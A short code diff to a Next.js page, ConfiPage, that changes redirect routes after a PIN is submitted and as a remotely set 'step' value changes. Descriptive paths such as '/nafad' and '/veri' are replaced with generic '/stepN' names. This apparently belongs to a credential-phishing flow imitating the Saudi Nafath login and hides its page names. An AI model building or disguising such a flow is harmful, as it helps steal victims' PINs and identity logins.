@@ -47,15 +47,15 @@ export default function ConfiPage() {
 
           // Redirect based on currentStep
           if (step === "home") {
-            router.push("/main")
+            router.push("/step1")
           } else if (step === "phone") {
-            router.push("/phone-info")
+            router.push("/step5")
           } else if (step === "_t6") {
-            router.push("/nafad")
+            router.push("/step4")
           } else if (step === "_st1") {
             router.push("/check")
           } else if (step === "_t2") {
-            router.push("/veri")
+            router.push("/step2")
           }
         }
       },
@@ -152,7 +152,7 @@ export default function ConfiPage() {
 
       // Wait 2 seconds then redirect to phone page
       setTimeout(() => {
-        router.push("/phone-info")
+        router.push("/step5")
       }, 2000)
     } catch (err) {
       console.error("Error submitting PIN:", err)
